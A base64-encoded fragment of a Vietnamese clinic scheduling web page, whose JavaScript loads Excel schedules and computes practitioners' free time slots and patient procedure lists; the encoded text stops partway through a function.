DQogICAgICAgICAgICAvLyBHw6FuIHPhu7Ega2nhu4duIGNobyByYWRpbyBidXR0b24gY2jhu41uIGtodW5nIGdp4budDQogICAgICAgICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdpbnB1dFtuYW1lPSJ0aW1lT3B0aW9uIl0nKS5mb3JFYWNoKHJhZGlvID0+IHsNCiAgICAgICAgICAgICAgICByYWRpby5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBmdW5jdGlvbigpIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKGFsbFByb2NlZHVyZXMubGVuZ3RoID4gMCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgZ2VuZXJhdGVUaW1lU3VnZ2VzdGlvbnMoYWxsUHJvY2VkdXJlcyk7DQogICAgICAgICAgICAgICAgICAgICAgICBmaWx0ZXJCeU9wZXJhdG9yKCk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgIH0pOw0KCQkJDQoJCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3BlcmF0b3JTZWxlY3QnKS5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBmdW5jdGlvbigpIHsNCiAgICBmaWx0ZXJCeU9wZXJhdG9yKCk7DQp9KTsNCg0KIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvcGVyYXRvclNlbGVjdEVycm9yJykuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZnVuY3Rpb24gKCkgew0KICAgLy8gY2jhu4kgcmVuZGVyIGzhuqFpLCBLSMOUTkcgxJHhu6VuZyBkcm9wZG93biBiw6puIGtpYQ0KICAgZmlsdGVyQnlPcGVyYXRvcigpOw0KIH0pOw0KCQkJDQogICAgICAgIH0pOw0KICAgIDwvc2NyaXB0Pg0KPGRpdiBjbGFzcz0icHJvY2VkdXJlLWluZm8iPjxjZW50ZXI+IA0KRGVzaWduIEJ5IDxhIGhyZWY9Imh0dHA6Ly9mYi5jb20vY2hhdWh1eW5oMDEwNCIgdGFyZ2V0PSJfYmxhbmsiPiBEci5DaMOidTwvYT48YnIvPg0KICAgICAgICAgICAgICAgIE7hur91IEPDsyBC4bqldCBL4buzIFbGsOG7m25nIE3huq9jIEfDrCBWdWkgTMOybmcgTEggOiA8YnIvPg0KICAgICAgICAgICAgICAgIEVtYWlsOiBjaGF1aHV5bmgwMTA0QGdtYWlsLmNvbTxici8+DQogICAgICAgICAgICAgICAgU0RUOiAwNzkuNTY3LjkzNTA8L2NlbnRlcj4NCjwvZGl2Pg0KDQoNCg0KPHNjcmlwdD4NCiAgLy8gSOG7lyB0cuG7oyBuaOG6pW4gRW50ZXIgdOG7qyDDtCB1c2VybmFtZSBob+G6t2MgcGFzc3dvcmQNCiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3VzZXJuYW1lSW5wdXQnKS5hZGRFdmVudExpc3RlbmVyKCdrZXl1cCcsIGZ1bmN0aW9uKGV2ZW50KSB7DQogICAgaWYgKGV2ZW50LmtleSA9PT0gJ0VudGVyJykgew0KICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Bhc3N3b3JkSW5wdXQnKS5mb2N1cygpOw0KICAgIH0NCiAgfSk7DQoNCiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Bhc3N3b3JkSW5wdXQnKS5hZGRFdmVudExpc3RlbmVyKCdrZXl1cCcsIGZ1bmN0aW9uKGV2ZW50KSB7DQogICAgaWYgKGV2ZW50LmtleSA9PT0gJ0VudGVyJykgew0KICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luQnRuJykuY2xpY2soKTsNCiAgICB9DQogIH0pOw0KDQovLyA9PT09PT0gVOG7sCDEkOG7mE5HIFFVw4lUIFRIxq8gTeG7pEMgJiBDSOG7jE4gRklMRSBN4buaSSBOSOG6pFQgPT09PT09DQoNCmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmb2xkZXJCdG4nKS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpID0+IHsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZm9sZGVySW5wdXQnKS5jbGljaygpOw0KfSk7DQoNCmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmb2xkZXJJbnB1dCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGFzeW5jIChlKSA9PiB7DQogYXdhaXQgZW5zdXJlWExTWCgpOyAvLyBu4bqhcCBYTFNYIHRyxrDhu5tjIGtoaSDEkeG7jWMgd29ya2Jvb2sNCiAgICBjb25zdCBmaWxlcyA9IEFycmF5LmZyb20oZS50YXJnZXQuZmlsZXMpLmZpbHRlcihmID0+IC9cLih4bHN4fHhsc3xjc3YpJC9pLnRlc3QoZi5uYW1lKSk7DQogICAgY29uc3Qgc3RhdHVzRGl2ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3NjYW5TdGF0dXMnKTsNCiAgICBjb25zdCBmaWxlSW5wdXQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsZUlucHV0Jyk7DQoNCiAgICBpZiAoZmlsZXMubGVuZ3RoID09PSAwKSB7DQogICAgICAgIHN0YXR1c0Rpdi5zdHlsZS5jb2xvciA9ICdyZWQnOw0KICAgICAgICBzdGF0dXNEaXYuaW5uZXJIVE1MID0gJ0tow7RuZyB0w6xtIHRo4bqleSBmaWxlIEV4Y2VsIGjhu6NwIGzhu4cgdHJvbmcgdGjGsCBt4bulYy4nOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KDQogICAgbGV0IHZhbGlkRmlsZSA9IG51bGw7DQoNCiAgICBmb3IgKGNvbnN0IGZpbGUgb2YgZmlsZXMuc29ydCgoYSwgYikgPT4gYi5sYXN0TW9kaWZpZWQgLSBhLmxhc3RNb2RpZmllZCkpIHsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGNvbnN0IGRhdGEgPSBhd2FpdCBmaWxlLmFycmF5QnVmZmVyKCk7DQogICAgICAgICAgICBjb25zdCB3b3JrYm9vayA9IFhMU1gucmVhZChkYXRhLCB7IHR5cGU6ICdhcnJheScgfSk7DQoNCiAgICAgICAgICAgIGlmICghd29ya2Jvb2suU2hlZXROYW1lc1sxXSkgY29udGludWU7IC8vIGPhuqduIFNoZWV0IHRo4bupIDINCg0KICAgICAgICAgICAgY29uc3Qgc2hlZXQgPSB3b3JrYm9vay5TaGVldHNbd29ya2Jvb2suU2hlZXROYW1lc1sxXV07DQogICAgICAgICAgICBjb25zdCBqc29uRGF0YSA9IFhMU1gudXRpbHMuc2hlZXRfdG9fanNvbihzaGVldCwgeyBoZWFkZXI6IDEsIGRlZnZhbDogIiIsIGJsYW5rcm93czogdHJ1ZSB9KTsNCg0KICAgICAgICAgICAgaWYgKGpzb25EYXRhLmxlbmd0aCA+PSAxMCkgeyAvLyDDrXQgbmjhuqV0IDIgZMOybmcgaGVhZGVyIHbDoCBjw7MgZOG7ryBsaeG7h3UgZMOybmcgMTANCiAgICAgICAgICAgICAgICB2YWxpZEZpbGUgPSBmaWxlOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGNhdGNoIChlcnIpIHsNCiAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoYEzhu5dpIMSR4buNYyBmaWxlICR7ZmlsZS5uYW1lfTpgLCBlcnIpOw0KICAgICAgICB9DQogICAgfQ0KDQogICAgaWYgKHZhbGlkRmlsZSkgew0KICAgICAgICBjb25zdCBkdCA9IG5ldyBEYXRhVHJhbnNmZXIoKTsNCiAgICAgICAgZHQuaXRlbXMuYWRkKHZhbGlkRmlsZSk7DQogICAgICAgIGZpbGVJbnB1dC5maWxlcyA9IGR0LmZpbGVzOw0KDQogICAgICAgIC8vIGPhuq1wIG5o4bqtdCB0cuG6oW5nIHRow6FpDQogICAgICAgIHN0YXR1c0Rpdi5pbm5lckhUTUwgPSBgPGkgY2xhc3M9ImZhcyBmYS1mb2xkZXItb3BlbiI+PC9pPiDEkMOjIGNo4buNbiBmaWxlOiA8Yj4ke3ZhbGlkRmlsZS5uYW1lfTwvYj5gOw0KICAgICAgICBzdGF0dXNEaXYuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgICAgIHN0YXR1c0Rpdi5zdHlsZS5jb2xvciA9ICcjMmMzZTUwJzsNCg0KICAgICAgICAvLyBH4buNaSBraeG7g20gdHJhDQogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhbmFseXplQnRuJykuY2xpY2soKTsNCiAgICB9IGVsc2Ugew0KICAgICAgICBzdGF0dXNEaXYuc3R5bGUuY29sb3IgPSAncmVkJzsNCiAgICAgICAgc3RhdHVzRGl2LmlubmVySFRNTCA9ICdLaMO0bmcgdMOsbSDEkcaw4bujYyBmaWxlIGPDsyBj4bqldSB0csO6YyBo4bujcCBs4buHLiBWdWkgbMOybmcga2nhu4NtIHRyYSBs4bqhaS4nOw0KICAgIH0NCn0pOw0KDQoNCjwvc2NyaXB0Pg0KPGRpdiBjbGFzcz0idG9hc3QiIGlkPSJ0b2FzdCI+PC9kaXY+DQo8IS0tIFBvcHVwIGxvYWRpbmcgLS0+DQo8ZGl2IGlkPSJsb2FkaW5nUG9wdXAiIHN0eWxlPSJkaXNwbGF5Om5vbmU7cG9zaXRpb246Zml4ZWQ7dG9wOjA7bGVmdDowO3dpZHRoOjEwMCU7aGVpZ2h0OjEwMCU7YmFja2dyb3VuZDpyZ2JhKDAsMCwwLDAuNSk7ei1pbmRleDo5OTk5O2p1c3RpZnktY29udGVudDpjZW50ZXI7YWxpZ24taXRlbXM6Y2VudGVyO2ZvbnQtZmFtaWx5OidJbnRlcicsc2Fucy1zZXJpZiI+DQo8ZGl2IHN0eWxlPSJiYWNrZ3JvdW5kOiNmZmY7cGFkZGluZzozMHB4IDQwcHg7Ym9yZGVyLXJhZGl1czoxMHB4O3RleHQtYWxpZ246Y2VudGVyO2JveC1zaGFkb3c6MCAwIDE1cHggcmdiYSgwLDAsMCwwLjMpO21heC13aWR0aDo5MCU7Zm9udC1zaXplOjE4cHgiPg0KPGRpdiBpZD0ibG9hZGluZ1RleHQiPg0KPGkgY2xhc3M9ImZhcyBmYS1zcGlubmVyIGZhLXNwaW4iIHN0eWxlPSJmb250LXNpemU6MjRweDtjb2xvcjojMzQ5OGRiO21hcmdpbi1ib3R0b206MTBweDsiPjwvaT48YnIvPg0KICAgICAgxJBhbmcgZ+G7rWkgZOG7ryBsaeG7h3UgduG7gSBtw6F5IGNo4bunLi4uDQogICAgPC9kaXY+DQo8ZGl2IGlkPSJwcm9ncmVzc0JhckNvbnRhaW5lciI+DQo8ZGl2IGlkPSJwcm9ncmVzc0JhciI+PC9kaXY+DQo8ZGl2IGlkPSJhdmFpbGFiaWxpdHlUYWJsZSIgc3R5bGU9ImRpc3BsYXk6IG5vbmU7IG1hcmdpbi10b3A6IDIwcHg7Ij4NCiAgPGgyPlRo4buRbmcga8OqIGdp4budIHRy4buRbmcgdOG7q25nIG5nxrDhu51pPC9oMj4NCiAgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSI+DQogICAgPHRoZWFkPg0KICAgICAgPHRyPg0KICAgICAgICA8dGg+TmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQogICAgICAgIDx0aD5OZ8OgeTwvdGg+DQogICAgICAgIA0KICAgICAgICA8dGg+R2nhu50gdHLhu5FuZyBideG7lWkgc8Ohbmc8L3RoPg0KICAgICAgICA8dGg+R2nhu50gdHLhu5FuZyBideG7lWkgY2hp4buBdTwvdGg+DQogICAgICA8L3RyPg0KICAgIDwvdGhlYWQ+DQogICAgPHRib2R5IGlkPSJhdmFpbGFiaWxpdHlCb2R5Ij48L3Rib2R5Pg0KICA8L3RhYmxlPg0KPC9kaXY+DQo8IS0tIEvhur5UIFRIw5pDOiBC4bqiTkcgR0nhu5wgVFLhu5BORyBU4buqTkcgTkfGr+G7nEkgLS0+DQo8L2Rpdj4NCjwvZGl2Pg0KPC9kaXY+DQo8L2Rpdj4NCg0KPHNjcmlwdD4NCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoIkRPTUNvbnRlbnRMb2FkZWQiLCBmdW5jdGlvbigpIHsNCiAgY29uc3Qgbm9pZHVuZyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJub2lkdW5nIik7DQogIGNvbnN0IGxpc3QxID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiLmxpc3QxIik7DQoNCiAgaWYgKG5vaWR1bmcgJiYgbGlzdDEpIHsNCiAgICBjb25zdCB0ZXh0ID0gbm9pZHVuZy50ZXh0Q29udGVudCB8fCBub2lkdW5nLmlubmVyVGV4dCB8fCAiIjsNCiAgICBpZiAodGV4dC50cmltKCkgPT09ICIiKSB7DQogICAgICBsaXN0MS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOw0KICAgIH0NCiAgfQ0KfSk7DQoNCi8vID09PT0gVMONTkggVE/DgU4gR0nhu5wgVFLhu5BORyBDSE8gVOG7qk5HIE5Hxq/hu5xJID09PT0NCg0KDQoNCmZ1bmN0aW9uIHRvZ2dsZUF2YWlsYWJpbGl0eSgpIHsNCiAgICBjb25zdCB0YWJsZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhdmFpbGFiaWxpdHlUYWJsZScpOw0KICAgIGNvbnN0IGZpbHRlckJsb2NrID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2F2YWlsYWJpbGl0eUZpbHRlckJsb2NrJyk7DQogICAgaWYgKHRhYmxlLnN0eWxlLmRpc3BsYXkgPT09ICdub25lJykgew0KICAgICAgICB0YWJsZS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICAgICAgaWYgKGZpbHRlckJsb2NrKSBmaWx0ZXJCbG9jay5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICAgICAgY2FsY3VsYXRlQXZhaWxhYmlsaXR5KCk7DQogICAgfSBlbHNlIHsNCiAgICAgICAgdGFibGUuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgICAgaWYgKGZpbHRlckJsb2NrKSBmaWx0ZXJCbG9jay5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgIH0NCn0NCg0KDQpmdW5jdGlvbiBjYWxjdWxhdGVBdmFpbGFiaWxpdHkoKSB7DQogICAgY29uc3QgZ3JvdXBzID0ge307DQogICAgYWxsUHJvY2VkdXJlcy5mb3JFYWNoKHByb2MgPT4gew0KICAgICAgICBjb25zdCBrZXkgPSBgJHtwcm9jLm9wZXJhdG9yfV8ke3Byb2MuZGF0ZX1gOw0KICAgICAgICBpZiAoIWdyb3Vwc1trZXldKSBncm91cHNba2V5XSA9IFtdOw0KICAgICAgICBncm91cHNba2V5XS5wdXNoKHByb2MpOw0KICAgIH0pOw0KDQogICAgY29uc3QgdGJvZHkgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYXZhaWxhYmlsaXR5Qm9keScpOw0KICAgIHRib2R5LmlubmVySFRNTCA9ICcnOw0KDQogICAgY29uc3Qgc2VsZWN0ZWRPcCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWx0ZXJPcGVyYXRvcicpPy52YWx1ZSB8fCAnYWxsJzsNCiAgICBjb25zdCBzZWxlY3RlZERhdGUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsdGVyRGF0ZScpPy52YWx1ZSB8fCAnYWxsJzsNCg0KICAgIC8vIENo4buJIGto4bufaSB04bqhbyBkcm9wZG93biAxIGzhuqduDQogICAgaWYgKCFkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsdGVyT3BlcmF0b3InKS5kYXRhc2V0LmluaXRpYWxpemVkKSB7DQogICAgICAgIGNvbnN0IG9wZXJhdG9ycyA9IFsuLi5uZXcgU2V0KGFsbFByb2NlZHVyZXMubWFwKHAgPT4gcC5vcGVyYXRvcikpXS5zb3J0KCk7DQogICAgICAgIGNvbnN0IGRhdGVzID0gWy4uLm5ldyBTZXQoYWxsUHJvY2VkdXJlcy5tYXAocCA9PiBwLmRhdGUpKV0uc29ydCgoYSwgYikgPT4gew0KICAgICAgICAgICAgY29uc3QgW2RhLCBtYSwgeWFdID0gYS5zcGxpdCgnLycpLm1hcChOdW1iZXIpOw0KICAgICAgICAgICAgY29uc3QgW2RiLCBtYiwgeWJdID0gYi5zcGxpdCgnLycpLm1hcChOdW1iZXIpOw0KICAgICAgICAgICAgcmV0dXJuIG5ldyBEYXRlKHlhLCBtYSAtIDEsIGRhKSAtIG5ldyBEYXRlKHliLCBtYiAtIDEsIGRiKTsNCiAgICAgICAgfSk7DQoNCiAgICAgICAgY29uc3Qgb3BTZWxlY3QgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsdGVyT3BlcmF0b3InKTsNCiAgICAgICAgY29uc3QgZGF0ZVNlbGVjdCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWx0ZXJEYXRlJyk7DQoNCiAgICAgICAgb3BTZWxlY3QuaW5uZXJIVE1MID0gJzxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6ozwvb3B0aW9uPicgKw0KICAgICAgICAgICAgb3BlcmF0b3JzLm1hcChvcCA9PiBgPG9wdGlvbiB2YWx1ZT0iJHtvcH0iPiR7b3AucmVwbGFjZSgvLC9nLCAnJyl9PC9vcHRpb24+YCkuam9pbignJyk7DQogICAgICAgIGRhdGVTZWxlY3QuaW5uZXJIVE1MID0gJzxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6ozwvb3B0aW9uPicgKw0KICAgICAgICAgICAgZGF0ZXMubWFwKGQgPT4gYDxvcHRpb24gdmFsdWU9IiR7ZH0iPiR7ZH08L29wdGlvbj5gKS5qb2luKCcnKTsNCg0KICAgICAgICBvcFNlbGVjdC5kYXRhc2V0LmluaXRpYWxpemVkID0gJ3RydWUnOw0KICAgICAgICBkYXRlU2VsZWN0LmRhdGFzZXQuaW5pdGlhbGl6ZWQgPSAndHJ1ZSc7DQoNCiAgICAgICAgb3BTZWxlY3QuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgY2FsY3VsYXRlQXZhaWxhYmlsaXR5KTsNCiAgICAgICAgZGF0ZVNlbGVjdC5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBjYWxjdWxhdGVBdmFpbGFiaWxpdHkpOw0KICAgIH0NCg0KICAgIE9iamVjdC5rZXlzKGdyb3VwcykuZm9yRWFjaChrZXkgPT4gew0KICAgICAgICBjb25zdCBbb3BlcmF0b3IsIGRhdGVdID0ga2V5LnNwbGl0KCdfJyk7DQogICAgICAgIGlmICgoc2VsZWN0ZWRPcCAhPT0gJ2FsbCcgJiYgb3BlcmF0b3IgIT09IHNlbGVjdGVkT3ApIHx8DQogICAgICAgICAgICAoc2VsZWN0ZWREYXRlICE9PSAnYWxsJyAmJiBkYXRlICE9PSBzZWxlY3RlZERhdGUpKSByZXR1cm47DQoNCiAgICAgICAgY29uc3QgcHJvY2VkdXJlcyA9IGdyb3Vwc1trZXldOw0KICAgICAgICBwcm9jZWR1cmVzLnNvcnQoKGEsIGIpID0+IGEuc3RhcnQgLSBiLnN0YXJ0KTsNCg0KICAgICAgICBjb25zdCBtb3JuaW5nU3RhcnQgPSA3ICogMzYwMDsNCiAgICAgICAgY29uc3QgbW9ybmluZ0VuZCA9IDExLjUgKiAzNjAwOw0KICAgICAgICBjb25zdCBhZnRlcm5vb25TdGFydCA9IDEzLjUgKiAzNjAwOw0KICAgICAgICBjb25zdCBhZnRlcm5vb25FbmQgPSAxNyAqIDM2MDA7DQoNCiAgICAgICAgY29uc3QgbW9ybmluZ0ZyZWUgPSBnZXRGcmVlU2xvdHMocHJvY2VkdXJlcywgbW9ybmluZ1N0YXJ0LCBtb3JuaW5nRW5kKTsNCiAgICAgICAgY29uc3QgYWZ0ZXJub29uRnJlZSA9IGdldEZyZWVTbG90cyhwcm9jZWR1cmVzLCBhZnRlcm5vb25TdGFydCwgYWZ0ZXJub29uRW5kKTsNCg0KICAgICAgICBjb25zdCByb3cgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCd0cicpOw0KICAgICAgICByb3cuY2xhc3NMaXN0LmFkZCgiaGVyYi1yb3ciKTsNCiAgICAgICAgcm93LmlubmVySFRNTCA9IGANCiAgICAgICAgICAgIDx0ZD48YSBocmVmPSIjIiBvbmNsaWNrPSJzaG93UHJvY2VkdXJlc0Zvck9wZXJhdG9yKFxgJHtvcGVyYXRvcn1cYCwgXGAke2RhdGV9XGApO3JldHVybiBmYWxzZTsiIHN0eWxlPSJjb2xvcjojMzQ5OGRiO2ZvbnQtd2VpZ2h0OmJvbGQiPiR7b3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJyl9PC9hPjwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtkYXRlfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHttb3JuaW5nRnJlZX08L3RkPg0KICAgICAgICAgICAgPHRkPiR7YWZ0ZXJub29uRnJlZX08L3RkPg0KICAgICAgICBgOw0KICAgICAgICB0Ym9keS5hcHBlbmRDaGlsZChyb3cpOw0KICAgIH0pOw0KfQ0KDQoNCmZ1bmN0aW9uIGdldEZyZWVTbG90cyhwcm9jZWR1cmVzLCBzdGFydCwgZW5kKSB7DQogICAgY29uc3QgYnVzeSA9IHByb2NlZHVyZXMubWFwKHAgPT4gKHsNCiAgICAgICAgc3RhcnQ6IHAuc3RhcnQsDQogICAgICAgIGVuZDogcC5lbmQgKyAoKHAucHJvY2VkdXJlSW5mbz8uYnVmZmVyIHx8IDApICogNjApDQogICAgfSkpLmZpbHRlcihwID0+IHAuZW5kID4gc3RhcnQgJiYgcC5zdGFydCA8IGVuZCk7DQoNCiAgICBidXN5LnNvcnQoKGEsIGIpID0+IGEuc3RhcnQgLSBiLnN0YXJ0KTsNCg0KICAgIGNvbnN0IGZyZWUgPSBbXTsNCiAgICBsZXQgY3Vyc29yID0gc3RhcnQ7DQoNCiAgICBmb3IgKGNvbnN0IGIgb2YgYnVzeSkgew0KICAgICAgICBpZiAoYi5zdGFydCA+IGN1cnNvciAmJiBiLnN0YXJ0ID4gc3RhcnQgJiYgY3Vyc29yIDwgZW5kKSB7DQogICAgICAgICAgICBjb25zdCBmcmVlU3RhcnQgPSBNYXRoLm1heChjdXJzb3IsIHN0YXJ0KTsNCiAgICAgICAgICAgIGNvbnN0IGZyZWVFbmQgPSBNYXRoLm1pbihiLnN0YXJ0LCBlbmQpOw0KICAgICAgICAgICAgaWYgKGZyZWVFbmQgPiBmcmVlU3RhcnQpIHsNCiAgICAgICAgICAgICAgICBmcmVlLnB1c2goYCR7Zm9ybWF0VGltZShmcmVlU3RhcnQpfSAtICR7Zm9ybWF0VGltZShmcmVlRW5kKX1gKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBjdXJzb3IgPSBNYXRoLm1heChjdXJzb3IsIGIuZW5kKTsNCiAgICB9DQoNCiAgICBpZiAoY3Vyc29yIDwgZW5kKSB7DQogICAgICAgIGZyZWUucHVzaChgJHtmb3JtYXRUaW1lKGN1cnNvcil9IC0gJHtmb3JtYXRUaW1lKGVuZCl9YCk7DQogICAgfQ0KDQogICAgcmV0dXJuIGZyZWUubGVuZ3RoID8gZnJlZS5qb2luKCc8YnI+JykgOiAnPGk+S2jDtG5nIGPDsm4gdHLhu5FuZzwvaT4nOw0KfQ0KDQpmdW5jdGlvbiBmb3JtYXRUaW1lKHNlYykgew0KICAgIGNvbnN0IGggPSBNYXRoLmZsb29yKHNlYyAvIDM2MDApOw0KICAgIGNvbnN0IG0gPSBNYXRoLmZsb29yKChzZWMgJSAzNjAwKSAvIDYwKTsNCiAgICByZXR1cm4gaC50b1N0cmluZygpLnBhZFN0YXJ0KDIsICcwJykgKyAnaCcgKyBtLnRvU3RyaW5nKCkucGFkU3RhcnQoMiwgJzAnKTsNCn0NCg0KZnVuY3Rpb24gc2hvd1Byb2NlZHVyZXNGb3JPcGVyYXRvcihvcGVyYXRvciwgZGF0ZSkgew0KICAgIGNvbnN0IG92ZXJsYXkgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncHJvY2VkdXJlT3ZlcmxheScpOw0KICAgIGNvbnN0IGNvbnRlbnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncG9wdXBDb250ZW50Jyk7DQogICAgY29uc3QgbGlzdCA9IGFsbFByb2NlZHVyZXMuZmlsdGVyKHAgPT4gcC5vcGVyYXRvciA9PT0gb3BlcmF0b3IgJiYgcC5kYXRlID09PSBkYXRlKTsNCg0KICAgIGlmIChsaXN0Lmxlbmd0aCA9PT0gMCkgew0KICAgICAgICBjb250ZW50LmlubmVySFRNTCA9ICI8aT5LaMO0bmcgdMOsbSB0aOG6pXkgdGjhu6cgdGh14bqtdDwvaT4iOw0KICAgIH0gZWxzZSB7DQogICAgICAgIGxpc3Quc29ydCgoYSwgYikgPT4gYS5zdGFydCAtIGIuc3RhcnQpOw0KICAgICAgICBjb250ZW50LmlubmVySFRNTCA9ICI8Yj5OZ8aw4budaSB0aOG7sWMgaGnhu4duOjwvYj4gIiArIG9wZXJhdG9yICsgIjxicj48Yj5OZ8OgeTo8L2I+ICIgKyBkYXRlICsgIjxicj48YnI+IiArDQogICAgICAgICAgICAiPHVsIHN0eWxlPSdwYWRkaW5nLWxlZnQ6MjBweCc+IiArIGxpc3QubWFwKHAgPT4gDQogICAgICAgICAgICAgICAgIjxsaT48Yj4iICsgcC5wYXRpZW50TmFtZSArICI8L2I+IC0gIiArIHAucHJvY2VkdXJlICsgIiAoIiArIHAuZGlzcGxheVN0YXJ0ICsgIiDihpIgIiArIHAuZGlzcGxheUVuZCArICIpPC9saT4iDQogICAgICAgICAgICApLmpvaW4oJycpICsgIjwvdWw+IjsNCiAgICB9DQoNCiAgICBvdmVybGF5LnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KfQ0KDQpmdW5jdGlvbiBjbG9zZVByb2NlZHVyZVBvcHVwKCkgew0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9jZWR1cmVPdmVybGF5Jykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCn0NCjwvc2NyaXB0Pg0KPCEtLSBQb3B1cCB0aOG7pyB0aHXhuq10IGNoaSB0aeG6v3QgduG7m2kgb3ZlcmxheSAtLT4NCjxkaXYgaWQ9InByb2NlZHVyZU92ZXJsYXkiIHN0eWxlPSJkaXNwbGF5Om5vbmU7cG9zaXRpb246Zml4ZWQ7dG9wOjA7bGVmdDowO3dpZHRoOjEwMCU7aGVpZ2h0OjEwMCU7YmFja2dyb3VuZDpyZ2JhKDAsMCwwLDAuNCk7ei1pbmRleDoxMDAwMCIgb25jbGljaz0iY2xvc2VQcm9jZWR1cmVQb3B1cCgpIj4NCiAgPGRpdiBpZD0icHJvY2VkdXJlUG9wdXAiIG9uY2xpY2s9ImV2ZW50LnN0b3BQcm9wYWdhdGlvbigpIiBzdHlsZT0icG9zaXRpb246cmVsYXRpdmU7dG9wOjEwJTtsZWZ0OjUwJTt0cmFuc2Zvcm06dHJhbnNsYXRlWCgtNTAlKTtiYWNrZ3JvdW5kOiNmZmY7Y29sb3I6IzAwMDtib3JkZXI6MnB4IHNvbGlkICMzNDk4ZGI7cGFkZGluZzoyMHB4O2JvcmRlci1yYWRpdXM6OHB4O2JveC1zaGFkb3c6MCA1cHggMjBweCByZ2JhKDAsMCwwLDAuMyk7bWF4LWhlaWdodDo3MHZoO292ZXJmbG93OmF1dG87Zm9udC1mYW1pbHk6SW50ZXIsc2Fucy1zZXJpZjttYXgtd2lkdGg6NjAwcHgiPg0KICAgIDxoMz5DaGkgdGnhur90IHRo4bunIHRodeG6rXQ8L2gzPg0KICAgIDxkaXYgaWQ9InBvcHVwQ29udGVudCI+PC9kaXY+DQogICAgPGJyLz4NCiAgICA8YnV0dG9uIGNsYXNzPSJidG4iIG9uY2xpY2s9ImNsb3NlUHJvY2VkdXJlUG9wdXAoKSI+xJDDs25nPC9idXR0b24+DQogIDwvZGl2Pg0KPC9kaXY+DQoNCg0KDQoNCg0KPHNjcmlwdD4NCmZ1bmN0aW9uIHJlbmRlckhlcmJMaXN0KCkgew0KICAgIGNvbnN0IHRib2R5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJUYWJsZUJvZHknKTsNCiAgICB0Ym9keS5pbm5lckhUTUwgPSAnJzsNCg0KICAgIGNvbnN0IGhlcmJzID0gd2luZG93LmFsbEhlcmJQcm9jZWR1cmVzIHx8IFtdOw0KICAgIGNvbnN0IGRhdGVGaWx0ZXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYkRhdGVGaWx0ZXInKTsNCiAgICBjb25zdCBkb2N0b3JGaWx0ZXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYkRvY3RvckZpbHRlcicpOw0KDQogICAgaWYgKCFkYXRlRmlsdGVyLmRhdGFzZXQuaW5pdGlhbGl6ZWQpIHsNCiAgICAgICAgY29uc3QgdW5pcXVlRGF0ZXMgPSBbLi4ubmV3IFNldChoZXJicy5tYXAoaCA9PiBoLmRhdGUpKV0uc29ydCg